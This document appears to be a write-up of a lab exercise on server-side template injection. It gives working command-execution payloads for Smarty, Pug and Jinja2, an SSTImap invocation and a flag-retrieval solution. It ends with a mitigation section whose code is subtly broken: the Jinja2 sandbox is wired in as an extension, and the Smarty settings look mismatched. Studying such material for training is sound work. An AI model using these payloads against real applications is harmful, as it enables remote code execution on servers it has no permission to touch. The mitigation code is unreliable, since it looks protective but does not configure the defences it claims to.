# Server-side Template Injection

## TASK 4 PHP - Smarty

Smarty is a PHP template engine that separates presentation from business logic. 
However, its ability to execute PHP functions within templates can expose applications to SSTI attacks if not securely configured.

Exploitation:

1. Confirm Smarty usage:
    - Inject {'Hello'|upper}. If it returns "HELLO," Smarty is in use.

2. Exploit SSTI:
    - Use payloads like {system("ls")} to execute commands (e.g., ls for directory listing) if PHP function execution is allowed.

## TASK 5 NodeJS - Pug

Pug (formerly known as Jade) is a template engine for Node.js, known for its concise syntax and features like conditionals, iterations, and template inheritance. 
However, its ability to execute JavaScript directly within templates can pose security risks if user inputs are not properly sanitized.

Key Vulnerabilities:
1. **JavaScript Interpolation** : Pug allows embedding JavaScript within templates using #{}. Unsanitized user input can lead to arbitrary code execution.
2. **Unescaped Interpolation**  : Using !{} disables automatic escaping, increasing the risk of XSS and other attacks.

Exploitation:
To confirm Pug usage, inject a simple payload like #{7*7}. If the output is 49, the application uses Pug.

Since Pug allows JavaScript interpolation, use the payload:

    #{root.process.mainModule.require('child_process').spawnSync('ls').stdout}

    Explanation:
    - root.process                        : Accesses the global process object.
    - mainModule.require('child_process') : Dynamically requires the child_process module.
    - spawnSync('ls')                     : Executes the ls command synchronously.
    - .stdout                             : Captures the command's output.

Why spawnSync('ls -lah') May Fail:
spawnSync does not split a single string into a command and arguments. Instead, it treats the string as the command, which may cause execution failure.

Understanding spawnSync Usage

    The spawnSync function in Node.js's child_process module executes commands and provides control over input/output. Its signature is:

    spawnSync(command, [args], [options])
    - command : The command to run.
    - args    : Array of arguments for the command.
    - options : Optional settings like working directory, environment variables, etc.

Correct Usage:

    To execute ls -lah, separate the command and arguments:

    const { spawnSync } = require('child_process');
    const result = spawnSync('ls', ['-lah']);
    console.log(result.stdout.toString());

    Here:
    - 'ls' is the command.
    - ['-lah'] is the argument array.

Final payload: 
    #{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

## TASK 6 Python - Jinja2

Jinja2 is a Python template engine widely used in web applications for rendering dynamic content. 
While it simplifies development, improper handling of user inputs can lead to security risks like SSTI.

Key Vulnerabilities:
    Expression Evaluation   : Jinja2 evaluates expressions within {{ }}, which can execute arbitrary Python code if exploited.
    Template Features       : Inheritance and macro imports can be misused for unintended code execution.

Exploitation:
1. Confirm Jinja2 usage:
    Inject {{7*7}}. If the output is 49, Jinja2 is in use.

2. Exploit SSTI:
    Payload: {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}

Payload Breakdown:
    "".__class__.__mro__[1]     : Accesses the base object class.
    __subclasses__()[157]       : Retrieves the subprocess.Popen class (index may vary).
    check_output(['ls', '-lah']): Executes the ls -lah command securely.

Why check_output('ls -lah') Fails:
    Passing the command as a single string is invalid. Use a list format to separate the command and arguments, e.g., ['ls', '-lah'].

Correct Usage:
    subprocess.check_output(['ls', '-lah']) ensures proper execution and minimizes shell injection risks.

Final payload: 
    {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}

## TASK 7 Automating the Exploitation

SSTImap is a tool that automates the process of testing and exploiting SSTI vulnerabilities in various template engines. 
Hosted on GitHub, it provides a framework for discovering template injection flaws.

Capabilities of SSTImap:
    Template Engine Detection   : SSTImap can help identify the template engine used by a web application, which is crucial for crafting specific exploits.
    Automated Exploitation      : For known vulnerabilities, SSTImap can automate the process of exploiting them.

Usage Example:
    You can use SSTImap by providing it with the target URL and any necessary options. Here's a simple usage example:

        python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='

    This command attempts to detect the SSTI vulnerability using tailored payloads.

## TASK 8 Extra-Mile Challenge

Edit the form through, POST /admin/forms/edit/index.php.
Inject {'Hello'|upper}, returns HELLO, proving that it uses PHP Smarty.
Inject {system("ls ../../../")}
Inject {system("cat ../../../105e15924c1e41bf53ea64afa0fa72b2.txt")}

## TASK 9 Mitigation  

To mitigate Server-side Template Injection (SSTI) risks, follow these best practices:  

Jinja2
    - Enable sandbox mode to restrict unsafe functions:  
```
from jinja2 import Environment, select_autoescape, sandbox
env = Environment(
        autoescape=select_autoescape(['html', 'xml']),
        extensions=[sandbox.SandboxedEnvironment]
)
```
    - Sanitize inputs to remove dangerous characters.  
    - Regularly audit templates for insecure patterns.  

Pug (Jade)
    - Avoid direct JavaScript evaluation in templates. Use safe alternatives like `#{}` for escaping.  
    - Validate and sanitize user inputs.  
    - Use secure configuration settings to disable risky features.  

Smarty
    - Disable `{php}` tags to prevent PHP code execution:  
```
$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
$smarty->disable_security = false;
```
    - Use secure handlers for user-customized templates.  
    - Regularly review templates and update Smarty for security patches.  

## Appendix: